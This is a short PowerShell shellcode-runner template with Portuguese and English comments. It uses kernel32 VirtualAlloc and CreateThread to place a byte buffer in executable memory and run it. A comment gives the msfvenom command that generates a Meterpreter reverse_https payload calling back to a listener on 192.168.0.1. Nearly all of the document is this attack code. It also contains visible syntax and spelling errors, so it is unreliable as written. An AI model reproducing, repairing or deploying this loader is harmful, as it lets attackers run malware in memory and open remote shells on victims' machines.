# This site is the best !! -
#                          |- https://pinvoke.net/ 
# Este site é o melhor     -

$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet = CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);


}

"@ 

Add-Type $Kernel32 

[Byte[]] $buf = "Shellcode here ! ou Shellcode aqui"  # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.1 LPORT=444 EXITFUNC=thread -f ps1
$size = $buf.length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0, size, 0x300, 0x40)
[System.Runtime.InteropService.Marshal]::Copy($buf, 0 $addr, $size)

$thread = [Kernel32]::CreateThread(0, 0, $addr, 0, 0, 0)
[Kernel32]::WaitForSingleObject($thread, [UInt32]"0xFFFFFFFF")